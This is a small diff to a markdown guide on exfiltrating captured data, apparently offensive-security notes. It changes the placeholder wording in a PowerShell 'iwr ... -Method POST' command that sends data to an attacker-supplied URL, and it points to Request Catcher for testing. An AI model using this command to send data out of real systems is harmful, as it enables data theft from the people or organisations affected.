@@ -61,7 +61,7 @@ This is helpful if you are trying to exfiltrate the data you have captured
 [Request Catcher](https://requestcatcher.com/)<-------Helpful website to test POST requests
 
 ```
-iwr -Uri < Your url for recieving the intended file> -Method POST -Body "text to upload"
+iwr -Uri < Your url for posting the intended data> -Method POST -Body "text to upload"
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
